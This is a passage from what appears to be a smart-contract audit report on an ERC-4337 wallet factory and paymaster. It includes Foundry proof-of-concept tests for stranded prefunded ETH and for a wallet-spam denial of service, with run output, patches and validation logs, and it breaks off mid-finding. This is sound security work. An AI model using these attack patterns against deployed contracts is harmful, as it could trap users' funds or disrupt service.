import { HPDepositRouter } from "@src/wallets/HPDepositRouter.sol";

import { WalletTestBase } from "./WalletTestBase.sol";

contract MockEntryPoint {
    mapping(address account => uint256 amount) public balanceOf;

    function depositTo(address account) external payable {
        balanceOf[account] += msg.value;
    }

    function addStake(uint32) external payable { }
    function unlockStake() external { }
    function withdrawStake(address payable) external { }
    function withdrawTo(address payable, uint256) external { }
}

contract WalletHarnessPlaceholderTest is WalletTestBase {
    uint256 internal constant SKIM_BPS = 50; // 0.5%

    MockEntryPoint internal mockEntryPoint;
    HPPaymaster internal paymaster;
    HPDepositRouter internal router;

    address internal depositor = makeAddr("depositor");

    function setUp() public override {
        super.setUp();

        mockEntryPoint = new MockEntryPoint();
        paymaster = new HPPaymaster(address(provider), address(mockEntryPoint));
        router = new HPDepositRouter(address(provider), SKIM_BPS);

        vm.prank(admin);
        provider.registerName("PAYMASTER", address(paymaster));

        vm.deal(depositor, 1 ether);
    }

    function _owners(uint256 n) internal pure returns (bytes[] memory owners) {
        owners = new bytes[](n);
        for (uint256 i; i < n; ++i) {
            owners[i] = abi.encode(address(uint160(i + 1)));
        }
    }

    function test_oversizedOwnersTrapPrefundsAtAdvertisedCounterfactualAddress() public {
        uint256 oversizedOwnerCount = 225;
        bytes[] memory oversizedOwners = _owners(oversizedOwnerCount);

        address predicted = factory.getAddress(oversizedOwners, 0);
        assertEq(predicted.code.length, 0, "counterfactual should start undeployed");

        vm.prank(depositor);
        router.depositNative{ value: 1 ether }(predicted);

        uint256 skim = (1 ether * SKIM_BPS) / 10_000;
        uint256 principal = 1 ether - skim;

        assertEq(predicted.balance, principal, "principal reaches the advertised address pre-deployment");
        assertEq(paymaster.gasCredit(predicted), skim, "router also pre-funds paymaster credit for that address");
        assertEq(mockEntryPoint.balanceOf(address(paymaster)), skim, "paymaster forwards skim into EntryPoint deposit");

        (bool deployed,) = address(factory).call{ gas: 30_000_000 }(
            abi.encodeCall(factory.createAccount, (oversizedOwners, 0))
        );

        assertFalse(deployed, "deployment should not fit inside a production-sized block gas budget");
        assertEq(predicted.code.length, 0, "failed initialization leaves no wallet code at the funded address");
        assertFalse(factory.isHPWallet(predicted), "factory never records the wallet because initialization failed");
        assertEq(factory.walletCount(), 0, "no wallet is enumerated after the failed deployment");

        assertEq(predicted.balance, principal, "prefunded ETH remains stranded at the undeployed address");
        assertEq(paymaster.gasCredit(predicted), skim, "gas credit also remains keyed to the undeployed address");

        address smallerOwnerSetAddress = factory.getAddress(_owners(oversizedOwnerCount - 1), 0);
        assertTrue(smallerOwnerSetAddress != predicted, "changing the owner list changes the CREATE2 salt/address");
    }
}
```

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd /repo/contracts && rm -rf out cache && forge build
```

### Output

```
[output truncated: 24 lines & 0.9990234375 KB skipped]
84 |     modifier notDelegated() virtual {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[PASS] test_oversizedOwnersTrapPrefundsAtAdvertisedCounterfactualAddress() (gas: 72382908)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 212.93ms (211.03ms CPU time)

Ran 1 test suite in 213.90ms (212.93ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

### Considerations

Executed as a Foundry unit PoC in contracts/test/wallets/WalletHarnessPlaceholder.t.sol using the public factory, router, and paymaster entry points. The undeployable condition is demonstrated with an explicit 30,000,000 gas cap on createAccount as a production-sized block-budget proxy; the measured breakpoint in this environment was 200+ owners, and the final PoC uses 225 owners for margin. The test proves stranded native principal plus paymaster gas credit at the advertised counterfactual address; it does not separately replay the same trap through depositToken, although the same pre-deployment funding model applies there.

## Remediation

### Explanation

Added a bounded owner-count check to HPSmartWalletFactory._validateOwners so both getAddress and createAccount reject oversized owner arrays that cannot be safely initialized on-chain. This prevents advertising or deploying counterfactual addresses bound to undeployable salts while preserving existing behavior for valid owner sets.

### Patch

```diff
diff --git a/contracts/src/wallets/HPSmartWalletFactory.sol b/contracts/src/wallets/HPSmartWalletFactory.sol
--- a/contracts/src/wallets/HPSmartWalletFactory.sol
+++ b/contracts/src/wallets/HPSmartWalletFactory.sol
@@ -1,132 +1,137 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { LibClone } from "@solady/utils/LibClone.sol";
 
 import { AddressBook } from "@core/AddressBook.sol";
 
 import { HPSmartWallet } from "./HPSmartWallet.sol";
 import { MultiOwnable } from "./base/MultiOwnable.sol";
 import { IHPWalletFactory } from "./interfaces/IHPWalletFactory.sol";
 import { OwnerValidation } from "./libraries/OwnerValidation.sol";
 
 /// @title HPSmartWalletFactory
 /// @notice CREATE2 ERC-1967 proxy factory for `HPSmartWallet` (Coinbase-style account factory). It is also the
 ///         authoritative wallet-legitimacy oracle: every wallet it deploys is flagged in `isHPWallet`, keyed by
 ///         the unforgeable CREATE2 address. The paymaster reads that flag to decide what to sponsor.
 /// @dev There is deliberately no owner -> wallet registry. Owner-to-wallet discovery is handled off-chain by
 ///      Turnkey (which manages the signer and the deterministic wallet address), and enumeration/analytics are
 ///      handled by indexing the `AccountCreated` event. This removes the unauthenticated, globally-exclusive
 ///      owner indexing that previously allowed registry poisoning and counterfactual-address squatting.
 contract HPSmartWalletFactory is AddressBook, IHPWalletFactory {
+    uint256 internal constant MAX_OWNERS = 64;
+
     address public immutable implementation;
 
     /// @notice Wallet-keyed legitimacy flag. Keyed by the CREATE2 address, so it cannot be poisoned by
     ///         attacker-chosen owner bytes. Read by `HPPaymaster` during validation (sender-associated storage).
     mapping(address wallet => bool) public isHPWallet;
 
     /// @dev Deployment order. Enumeration only; prefer indexing `AccountCreated` off-chain for large sets.
     address[] private _wallets;
 
     event AccountCreated(address indexed account, bytes[] owners, uint256 nonce);
 
     error ImplementationUndeployed();
     error OwnerRequired();
+    error TooManyOwners(uint256 provided, uint256 max);
 
     constructor(address implementation_, address addressProvider_) payable AddressBook(addressProvider_) {
         if (implementation_.code.length == 0) revert ImplementationUndeployed();
         implementation = implementation_;
     }
 
     /// @notice Deploys (or returns) the deterministic wallet for `owners` + `nonce` and flags it as an HP wallet.
     /// @dev Idempotent: an already-deployed wallet is returned without re-initialization or re-flagging. The salt
     ///      covers only owners + nonce, so user settings cannot influence the counterfactual address.
     function createAccount(bytes[] calldata owners, uint256 nonce)
         external
         payable
         virtual
         returns (HPSmartWallet account)
     {
         _validateOwners(owners);
 
         (bool alreadyDeployed, address accountAddress) =
             LibClone.createDeterministicERC1967(msg.value, implementation, _getSalt(owners, nonce));
 
         account = HPSmartWallet(payable(accountAddress));
 
         if (!alreadyDeployed) {
             account.initialize(owners);
             isHPWallet[accountAddress] = true;
             _wallets.push(accountAddress);
             emit AccountCreated(accountAddress, owners, nonce);
         }
     }
 
     /// @notice Counterfactual wallet address for `owners` + `nonce` (used by the client and Turnkey config).
     /// @dev Validates `owners` with the same rules as deployment, so a predicted address is always deployable
     ///      (no advertising of addresses that `createAccount` would reject, which could trap pre-funded ETH).
     function getAddress(bytes[] calldata owners, uint256 nonce) external view returns (address) {
         _validateOwners(owners);
         return LibClone.predictDeterministicAddress(initCodeHash(), _getSalt(owners, nonce), address(this));
     }
 
     function initCodeHash() public view virtual returns (bytes32) {
         return LibClone.initCodeHashERC1967(implementation);
     }
 
     // --------------------------------------------
     //  Enumeration
     // --------------------------------------------
 
     function walletCount() external view returns (uint256) {
         return _wallets.length;
     }
 
     function walletAt(uint256 index) external view returns (address) {
         return _wallets[index];
     }
 
     /// @notice Paginated read — prefer this (or off-chain `AccountCreated` indexing) for large sets.
     function getWallets(uint256 offset, uint256 limit) external view returns (address[] memory) {
         return _getWalletsSlice(offset, limit);
     }
 
     function getAllWallets() external view returns (address[] memory) {
         return _getWalletsSlice(0, _wallets.length);
     }
 
     function _getWalletsSlice(uint256 offset, uint256 limit) private view returns (address[] memory wallets) {
         uint256 n = _wallets.length;
         if (offset >= n || limit == 0) {
             return new address[](0);
         }
         uint256 end = offset + limit;
         if (end > n) end = n;
         uint256 len = end - offset;
         wallets = new address[](len);
         for (uint256 i; i < len; ++i) {
             wallets[i] = _wallets[offset + i];
         }
     }
 
-    /// @dev Mirrors deployment-time owner validation: non-empty, each owner controllable, no duplicates. Keeps
-    ///      counterfactual prediction and deployment in lockstep so funds are never sent to an undeployable
-    ///      address. Note `OwnerValidation` cannot reject the (unknowable here) future wallet's own address as an
-    ///      owner; that self-owner case is caught at deployment by `MultiOwnable._addOwnerAtIndex`.
+    /// @dev Mirrors deployment-time owner validation: non-empty, bounded to deployment-safe size, each owner
+    ///      controllable, no duplicates. Keeps counterfactual prediction and deployment in lockstep so funds are
+    ///      never sent to an undeployable address. Note `OwnerValidation` cannot reject the (unknowable here)
+    ///      future wallet's own address as an owner; that self-owner case is caught at deployment by
+    ///      `MultiOwnable._addOwnerAtIndex`.
     function _validateOwners(bytes[] calldata owners) internal pure {
         if (owners.length == 0) revert OwnerRequired();
+        if (owners.length > MAX_OWNERS) revert TooManyOwners(owners.length, MAX_OWNERS);
 
         for (uint256 i; i < owners.length; ++i) {
             OwnerValidation.validate(owners[i]);
 
             bytes32 ownerHash = keccak256(owners[i]);
             for (uint256 j; j < i; ++j) {
                 if (ownerHash == keccak256(owners[j])) revert MultiOwnable.AlreadyOwner(owners[i]);
             }
         }
     }
 
     function _getSalt(bytes[] calldata owners, uint256 nonce) internal pure returns (bytes32) {
         return keccak256(abi.encode(owners, nonce));
     }
 }
```

### Affected files
- `contracts/src/wallets/HPSmartWalletFactory.sol`

### Validation output

```
[output truncated: 33 lines & 1.50390625 KB skipped]

Failing tests:
Encountered 1 failing test in test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[FAIL: TooManyOwners(225, 64)] test_oversizedOwnersTrapPrefundsAtAdvertisedCounterfactualAddress() (gas: 171498)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

---

# Unbounded Wallet Enumeration DoS
**#85736**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/HPSmartWalletFactory.sol` (3 locations)
#### Lines 44-61 — _Permissionless wallet creation appends every newly deployed wallet to `_wallets`._

```
    function createAccount(bytes[] calldata owners, uint256 nonce)
        external
        payable
        virtual
        returns (HPSmartWallet account)
    {
        _validateOwners(owners);

        (bool alreadyDeployed, address accountAddress) =
            LibClone.createDeterministicERC1967(msg.value, implementation, _getSalt(owners, nonce));

        account = HPSmartWallet(payable(accountAddress));

        if (!alreadyDeployed) {
            account.initialize(owners);
            isHPWallet[accountAddress] = true;
            _wallets.push(accountAddress);
            emit AccountCreated(accountAddress, owners, nonce);
```

⋯
#### Lines 89-95 — _The factory exposes both paginated enumeration and a full-array `getAllWallets` endpoint._

```
    /// @notice Paginated read — prefer this (or off-chain `AccountCreated` indexing) for large sets.
    function getWallets(uint256 offset, uint256 limit) external view returns (address[] memory) {
        return _getWalletsSlice(offset, limit);
    }

    function getAllWallets() external view returns (address[] memory) {
        return _getWalletsSlice(0, _wallets.length);
```

⋯
#### Lines 98-109 — _The helper allocates and copies one return element for every requested wallet._

```
    function _getWalletsSlice(uint256 offset, uint256 limit) private view returns (address[] memory wallets) {
        uint256 n = _wallets.length;
        if (offset >= n || limit == 0) {
            return new address[](0);
        }
        uint256 end = offset + limit;
        if (end > n) end = n;
        uint256 len = end - offset;
        wallets = new address[](len);
        for (uint256 i; i < len; ++i) {
            wallets[i] = _wallets[offset + i];
        }
```

## Description

The factory exposes a full-array enumeration endpoint even though wallet creation is permissionless and every fresh deployment appends to the private `_wallets` array. `createAccount` has no caller restriction or per-owner registry, so an attacker can deploy arbitrary valid wallets with new nonces and grow `_wallets` at will. `getAllWallets` then calls `_getWalletsSlice(0, _wallets.length)`, allocates an array of that full length, and copies every stored wallet in a loop. Once enough spam wallets exist, the full enumeration call exceeds practical `eth_call` or on-chain gas limits even though paginated reads still work. This is a whole-file liveness issue in the advertised enumeration surface, not in wallet deployment itself.

## Root cause

`HPSmartWalletFactory` combines permissionless, unbounded writes to `_wallets` with a public `getAllWallets` endpoint that performs an unbounded full-array copy. The contract provides pagination, but it still exposes the non-paginated path without a size cap.

## Impact

Any integration that relies on `getAllWallets` for discovery or reconciliation can be made unable to retrieve the complete factory wallet set. The attacker does not need privileged access and only pays the deployment gas for spam wallets, while the affected read path becomes permanently more expensive as state grows.

## Proof of concept

### Test case

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.34;

import { HPSmartWalletFactory } from "@src/wallets/HPSmartWalletFactory.sol";
import { WalletTestBase } from "./WalletTestBase.sol";

contract WalletHarnessPlaceholderTest is WalletTestBase {
    address internal attacker = makeAddr("attacker");

    function _spamWallets(uint256 count) internal {
        bytes[] memory owners = _singleOwner(ownerEOA);
        vm.startPrank(attacker);
        for (uint256 i; i < count; ++i) {
            factory.createAccount(owners, i);
        }
        vm.stopPrank();
    }

    function test_measure_getAllWalletsGasGrowth() public {
        _spamWallets(300);

        uint256 gasBefore = gasleft();
        address[] memory wallets = factory.getAllWallets();
        uint256 gasUsed = gasBefore - gasleft();

        emit log_named_uint("wallet count", wallets.length);
        emit log_named_uint("getAllWallets gas", gasUsed);
        assertEq(wallets.length, 300);
        assertGt(gasUsed, 200_000);
    }

    function test_getAllWallets_failsUnderModestGasCapWhilePaginationStillWorks() public {
        _spamWallets(300);

        (bool ok,) = address(factory).call{gas: 150_000}(abi.encodeCall(HPSmartWalletFactory.getAllWallets, ()));
        emit log_named_uint("wallet count", factory.walletCount());
        assertFalse(ok);

        address[] memory page = factory.getWallets(0, 20);
        assertEq(page.length, 20);
        assertEq(page[0], factory.walletAt(0));
        assertEq(page[19], factory.walletAt(19));
    }
}
```

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd /repo/contracts && rm -rf out cache && forge build
```

### Output

```
[output truncated: 32 lines & 1.322265625 KB skipped]

[PASS] test_measure_getAllWalletsGasGrowth() (gas: 72802252)
Logs:
  wallet count: 300
  getAllWallets gas: 215245

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 29.56ms (51.54ms CPU time)

Ran 1 test suite in 43.08ms (29.56ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

### Considerations

PoC demonstrates the liveness failure with 300 spammed wallets and a 150,000-gas caller budget in `contracts/test/wallets/WalletHarnessPlaceholder.t.sol`; the exact break point on production callers depends on their `eth_call`/transaction gas budget, but the unbounded full-array copy is verified to scale until the non-paginated path becomes unusable while pagination still works.

## Remediation

### Explanation

Bounded the non-paginated factory enumeration path by rejecting getAllWallets once the wallet set exceeds a fixed safe size, preserving permissionless wallet creation and paginated reads while removing the unbounded full-array copy that caused the DoS surface.

### Patch

```diff
diff --git a/contracts/src/wallets/HPSmartWalletFactory.sol b/contracts/src/wallets/HPSmartWalletFactory.sol
--- a/contracts/src/wallets/HPSmartWalletFactory.sol
+++ b/contracts/src/wallets/HPSmartWalletFactory.sol
@@ -1,132 +1,135 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { LibClone } from "@solady/utils/LibClone.sol";
 
 import { AddressBook } from "@core/AddressBook.sol";
 
 import { HPSmartWallet } from "./HPSmartWallet.sol";
 import { MultiOwnable } from "./base/MultiOwnable.sol";
 import { IHPWalletFactory } from "./interfaces/IHPWalletFactory.sol";
 import { OwnerValidation } from "./libraries/OwnerValidation.sol";
 
 /// @title HPSmartWalletFactory
 /// @notice CREATE2 ERC-1967 proxy factory for `HPSmartWallet` (Coinbase-style account factory). It is also the
 ///         authoritative wallet-legitimacy oracle: every wallet it deploys is flagged in `isHPWallet`, keyed by
 ///         the unforgeable CREATE2 address. The paymaster reads that flag to decide what to sponsor.
 /// @dev There is deliberately no owner -> wallet registry. Owner-to-wallet discovery is handled off-chain by
 ///      Turnkey (which manages the signer and the deterministic wallet address), and enumeration/analytics are
 ///      handled by indexing the `AccountCreated` event. This removes the unauthenticated, globally-exclusive
 ///      owner indexing that previously allowed registry poisoning and counterfactual-address squatting.
 contract HPSmartWalletFactory is AddressBook, IHPWalletFactory {
     address public immutable implementation;
+    uint256 internal constant MAX_GET_ALL_WALLETS = 256;
 
     /// @notice Wallet-keyed legitimacy flag. Keyed by the CREATE2 address, so it cannot be poisoned by
     ///         attacker-chosen owner bytes. Read by `HPPaymaster` during validation (sender-associated storage).
     mapping(address wallet => bool) public isHPWallet;
 
     /// @dev Deployment order. Enumeration only; prefer indexing `AccountCreated` off-chain for large sets.
     address[] private _wallets;
 
     event AccountCreated(address indexed account, bytes[] owners, uint256 nonce);
 
     error ImplementationUndeployed();
     error OwnerRequired();
+    error GetAllWalletsDisabled();
 
     constructor(address implementation_, address addressProvider_) payable AddressBook(addressProvider_) {
         if (implementation_.code.length == 0) revert ImplementationUndeployed();
         implementation = implementation_;
     }
 
     /// @notice Deploys (or returns) the deterministic wallet for `owners` + `nonce` and flags it as an HP wallet.
     /// @dev Idempotent: an already-deployed wallet is returned without re-initialization or re-flagging. The salt
     ///      covers only owners + nonce, so user settings cannot influence the counterfactual address.
     function createAccount(bytes[] calldata owners, uint256 nonce)
         external
         payable
         virtual
         returns (HPSmartWallet account)
     {
         _validateOwners(owners);
 
         (bool alreadyDeployed, address accountAddress) =
             LibClone.createDeterministicERC1967(msg.value, implementation, _getSalt(owners, nonce));
 
         account = HPSmartWallet(payable(accountAddress));
 
         if (!alreadyDeployed) {
             account.initialize(owners);
             isHPWallet[accountAddress] = true;
             _wallets.push(accountAddress);
             emit AccountCreated(accountAddress, owners, nonce);
         }
     }
 
     /// @notice Counterfactual wallet address for `owners` + `nonce` (used by the client and Turnkey config).
     /// @dev Validates `owners` with the same rules as deployment, so a predicted address is always deployable
     ///      (no advertising of addresses that `createAccount` would reject, which could trap pre-funded ETH).
     function getAddress(bytes[] calldata owners, uint256 nonce) external view returns (address) {
         _validateOwners(owners);
         return LibClone.predictDeterministicAddress(initCodeHash(), _getSalt(owners, nonce), address(this));
     }
 
     function initCodeHash() public view virtual returns (bytes32) {
         return LibClone.initCodeHashERC1967(implementation);
     }
 
     // --------------------------------------------
     //  Enumeration
     // --------------------------------------------
 
     function walletCount() external view returns (uint256) {
         return _wallets.length;
     }
 
     function walletAt(uint256 index) external view returns (address) {
         return _wallets[index];
     }
 
     /// @notice Paginated read — prefer this (or off-chain `AccountCreated` indexing) for large sets.
     function getWallets(uint256 offset, uint256 limit) external view returns (address[] memory) {
         return _getWalletsSlice(offset, limit);
     }
 
     function getAllWallets() external view returns (address[] memory) {
+        if (_wallets.length > MAX_GET_ALL_WALLETS) revert GetAllWalletsDisabled();
         return _getWalletsSlice(0, _wallets.length);
     }
 
     function _getWalletsSlice(uint256 offset, uint256 limit) private view returns (address[] memory wallets) {
         uint256 n = _wallets.length;
         if (offset >= n || limit == 0) {
             return new address[](0);
         }
         uint256 end = offset + limit;
         if (end > n) end = n;
         uint256 len = end - offset;
         wallets = new address[](len);
         for (uint256 i; i < len; ++i) {
             wallets[i] = _wallets[offset + i];
         }
     }
 
     /// @dev Mirrors deployment-time owner validation: non-empty, each owner controllable, no duplicates. Keeps
     ///      counterfactual prediction and deployment in lockstep so funds are never sent to an undeployable
     ///      address. Note `OwnerValidation` cannot reject the (unknowable here) future wallet's own address as an
     ///      owner; that self-owner case is caught at deployment by `MultiOwnable._addOwnerAtIndex`.
     function _validateOwners(bytes[] calldata owners) internal pure {
         if (owners.length == 0) revert OwnerRequired();
 
         for (uint256 i; i < owners.length; ++i) {
             OwnerValidation.validate(owners[i]);
 
             bytes32 ownerHash = keccak256(owners[i]);
             for (uint256 j; j < i; ++j) {
                 if (ownerHash == keccak256(owners[j])) revert MultiOwnable.AlreadyOwner(owners[i]);
             }
         }
     }
 
     function _getSalt(bytes[] calldata owners, uint256 nonce) internal pure returns (bytes32) {
         return keccak256(abi.encode(owners, nonce));
     }
 }
```

### Affected files
- `contracts/src/wallets/HPSmartWalletFactory.sol`

### Validation output

```
[output truncated: 37 lines & 1.595703125 KB skipped]

Failing tests:
Encountered 1 failing test in test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[FAIL: GetAllWalletsDisabled()] test_measure_getAllWalletsGasGrowth() (gas: 72583701)

Encountered a total of 1 failing tests, 1 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

---

# Pending Credit Counts As Surplus
**#85738**
- Severity: Low
- Validity: Invalid

## Source locations

### `contracts/src/wallets/HPPaymaster.sol` (4 locations)
#### Lines 71-74 — _Surplus withdrawal authority is limited to AddressProvider default admins._

```
    /// @dev Admin = holder of the AddressProvider's DEFAULT_ADMIN_ROLE; no separate ownership system.
    modifier onlyAdmin() {
        if (!addressProvider.hasRole(bytes32(0), msg.sender)) revert NotAdmin();
        _;
```

⋯
#### Lines 117-142 — _Validation reserves by reducing `gasCredit` and `totalGasCredit` before settlement._

```
    /// @inheritdoc IPaymaster06
    /// @dev Reserves the operation's full worst-case cost (`maxCost` + postOp margin priced at `maxFeePerGas`)
    ///      by debiting `gasCredit[sender]` here, so the same credit cannot be approved twice within one
    ///      EntryPoint batch. `postOp` refunds the unused remainder. The reserved amount and the fee caps are
    ///      carried in `context` for settlement.
    function validatePaymasterUserOp(UserOperation06 calldata userOp, bytes32, uint256 maxCost)
        external
        onlyEntryPoint
        returns (bytes memory context, uint256 validationData)
    {
        address sender = userOp.sender;

        // Wallet deployment (initCode) runs before paymaster validation, so freshly created wallets are
        // already flagged by the factory at this point.
        if (!walletFactory.isHPWallet(sender)) revert WalletNotRegistered(sender);

        uint256 reserved = maxCost + POST_OP_GAS * userOp.maxFeePerGas;
        uint256 credit = gasCredit[sender];
        if (credit < reserved) revert InsufficientGasCredit(sender, credit, reserved);

        unchecked {
            gasCredit[sender] = credit - reserved;
            totalGasCredit -= reserved;
        }

        return (abi.encode(sender, reserved, userOp.maxFeePerGas, userOp.maxPriorityFeePerGas), 0);
```

⋯
#### Lines 145-172 — _`postOp` later refunds the unused reservation back into credit accounting._

```
    /// @inheritdoc IPaymaster06
    /// @dev Never reverts (a revert would force a `postOpReverted` re-call). Charges `actualGasCost` plus the
    ///      postOp margin priced at the *user-operation* fee rate the EntryPoint settles at —
    ///      `min(maxFeePerGas, maxPriorityFeePerGas + basefee)`, not `tx.gasprice` — and refunds the reservation
    ///      remainder to the wallet.
    function postOp(PostOpMode, bytes calldata context, uint256 actualGasCost) external onlyEntryPoint {
        (address wallet, uint256 reserved, uint256 maxFeePerGas, uint256 maxPriorityFeePerGas) =
            abi.decode(context, (address, uint256, uint256, uint256));

        // Mirror the EntryPoint's own `unchecked` gas-price computation exactly: validation bounds only
        // `maxFeePerGas`, so a wallet could pass `maxPriorityFeePerGas` near `type(uint256).max`. Checked
        // arithmetic would overflow and revert here, breaking the "never reverts" contract; the unchecked wrap
        // matches `min(maxFeePerGas, maxPriorityFeePerGas + basefee)` as the EntryPoint settles it.
        uint256 feePerGas;
        unchecked {
            feePerGas = maxPriorityFeePerGas + block.basefee;
        }
        if (maxFeePerGas < feePerGas) feePerGas = maxFeePerGas;

        uint256 charge = actualGasCost + POST_OP_GAS * feePerGas;
        if (charge > reserved) charge = reserved;

        uint256 refund = reserved - charge;

        unchecked {
            gasCredit[wallet] += refund;
            totalGasCredit += refund;
        }
```

⋯
#### Lines 194-210 — _Withdrawable surplus is computed only from EntryPoint balance minus the currently reduced `totalGasCredit`._

```
    /// @notice Withdraws EntryPoint deposit above the sum of outstanding user credits (e.g. accumulated
    ///         postOp margins). User credits themselves can never be withdrawn by the platform.
    function withdrawSurplus(address payable to, uint256 amount) external onlyAdmin {
        if (to == address(0)) revert ZeroWithdrawAddress();

        uint256 available = surplus();
        if (amount > available) revert WithdrawExceedsSurplus(amount, available);

        entryPoint.withdrawTo(to, amount);

        emit SurplusWithdrawn(to, amount);
    }

    /// @notice EntryPoint deposit not backing any user credit.
    function surplus() public view returns (uint256) {
        uint256 deposit = entryPoint.balanceOf(address(this));
        return deposit > totalGasCredit ? deposit - totalGasCredit : 0;
```

### `contracts/src/wallets/HPSmartWallet.sol`
#### Lines 269-317 — _An EntryPoint-authorized wallet operation can call arbitrary targets, including the paymaster._

```
    function execute(address target, uint256 value, bytes calldata data)
        external
        payable
        virtual
        onlyEntryPointOrOwner
    {
        _call(target, value, data);
    }

    function executeBatch(Call[] calldata calls) external payable virtual onlyEntryPointOrOwner {
        for (uint256 i; i < calls.length; i++) {
            _call(calls[i].target, calls[i].value, calls[i].data);
        }
    }

    function entryPoint() public view virtual returns (address) {
        return 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
    }

    function getUserOpHashWithoutChainId(UserOperation06 calldata userOp) public view virtual returns (bytes32) {
        return keccak256(abi.encode(UserOperation06Hash.hash(userOp), entryPoint()));
    }

    function implementation() public view returns (address $) {
        assembly ("memory-safe") {
            $ := sload(_ERC1967_IMPLEMENTATION_SLOT)
        }
    }

    function canSkipChainIdValidation(bytes4 functionSelector) public pure returns (bool) {
        if (
            functionSelector == MultiOwnable.addOwnerPublicKey.selector
                || functionSelector == MultiOwnable.addOwnerAddress.selector
                || functionSelector == MultiOwnable.removeOwnerAtIndex.selector
                || functionSelector == UUPSUpgradeable.upgradeToAndCall.selector
        ) {
            return true;
        }
        return false;
    }

    function _call(address target, uint256 value, bytes memory data) internal {
        (bool success, bytes memory result) = target.call{ value: value }(data);
        if (!success) {
            assembly ("memory-safe") {
                revert(add(result, 32), mload(result))
            }
        }
    }
```

### `contracts/lib/account-abstraction/contracts/legacy/v06/IPaymaster06.sol`
#### Lines 40-50 — _`postOp` is a separate post-operation callback after paymaster validation._

```
     * post-operation handler.
     * Must verify sender is the entryPoint
     * @param mode enum with the following options:
     *      opSucceeded - user operation succeeded.
     *      opReverted  - user op reverted. still has to pay for gas.
     *      postOpReverted - user op succeeded, but caused postOp (in mode=opSucceeded) to revert.
     *                       Now this is the 2nd call, after user's op was deliberately reverted.
     * @param context - the context value returned by validatePaymasterUserOp
     * @param actualGasCost - actual gas used so far (without this postOp call).
     */
    function postOp(PostOpMode mode, bytes calldata context, uint256 actualGasCost) external;
```

## Description

`HPPaymaster` removes a sponsored operation’s reservation from both `gasCredit[sender]` and `totalGasCredit` during `validatePaymasterUserOp`, then relies on the later `postOp` callback to refund the unused part of that reservation. During that validation-to-`postOp` window, `withdrawSurplus` computes withdrawable ETH solely as `entryPoint.balanceOf(address(this)) - totalGasCredit`, so any backing ETH that is no longer counted in `totalGasCredit` is treated as platform surplus. A wallet that is also an AddressProvider default admin can submit a sponsored operation whose wallet execution calls `withdrawSurplus` before its own `postOp` settlement restores the reservation accounting. That call withdraws ETH that is still backing the in-flight reservation, and the later `postOp` adds the refund back to user credit without restoring the withdrawn EntryPoint deposit. The issue is limited to an admin-role wallet or an admin that deliberately grants an HP wallet that role, but it contradicts the contract’s stated surplus boundary for user credits.

## Root cause

`totalGasCredit` is used as both settled liability accounting and in-flight reservation accounting. `surplus()` has no separate `reservedGasCredit` component, so `withdrawSurplus` treats pending reservations as withdrawable surplus during the ERC-4337 operation window.

## Impact

A privileged admin wallet can convert pending gas-credit backing into externally withdrawn ETH and leave the aggregate paymaster deposit below recorded user credits. Future sponsored operations for unrelated wallets can then fail from an under-backed EntryPoint deposit, or the deficit is absorbed by later treasury top-ups.

---

# Uncontrollable address owners can permanently brick wallets
**#85740**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/libraries/OwnerValidation.sol`
#### Lines 19-29 — _Any non-zero 32-byte value within the address range is accepted as a valid address owner._

```
    /// @notice Reverts unless `owner` encodes a controllable owner.
    /// @dev 32 bytes: a non-zero EOA address within the uint160 range. 64 bytes: a secp256r1 public key whose
    ///      `(x, y)` lies on the curve (`ecAff_isOnCurve` also rejects `(0, 0)` and out-of-field coordinates).
    function validate(bytes memory owner) internal pure {
        if (owner.length == 32) {
            uint256 value = uint256(bytes32(owner));
            if (value == 0 || value > type(uint160).max) {
                revert InvalidEthereumAddressOwner(owner);
            }
            return;
        }
```

### `contracts/src/wallets/HPSmartWalletFactory.sol` (2 locations)
#### Lines 44-61 — _Accepted owners are used to deploy, initialize, and mark the wallet as legitimate._

```
    function createAccount(bytes[] calldata owners, uint256 nonce)
        external
        payable
        virtual
        returns (HPSmartWallet account)
    {
        _validateOwners(owners);

        (bool alreadyDeployed, address accountAddress) =
            LibClone.createDeterministicERC1967(msg.value, implementation, _getSalt(owners, nonce));

        account = HPSmartWallet(payable(accountAddress));

        if (!alreadyDeployed) {
            account.initialize(owners);
            isHPWallet[accountAddress] = true;
            _wallets.push(accountAddress);
            emit AccountCreated(accountAddress, owners, nonce);
```

⋯
#### Lines 116-126 — _Factory validation checks only per-owner syntax and duplicate raw bytes._

```
    function _validateOwners(bytes[] calldata owners) internal pure {
        if (owners.length == 0) revert OwnerRequired();

        for (uint256 i; i < owners.length; ++i) {
            OwnerValidation.validate(owners[i]);

            bytes32 ownerHash = keccak256(owners[i]);
            for (uint256 j; j < i; ++j) {
                if (ownerHash == keccak256(owners[j])) revert MultiOwnable.AlreadyOwner(owners[i]);
            }
        }
```

### `contracts/src/wallets/base/MultiOwnable.sol` (4 locations)
#### Lines 42-58 — _Address-owner addition and the last-owner removal guard that only checks `ownerCount()`._

```
    function addOwnerAddress(address owner) external virtual onlyOwner {
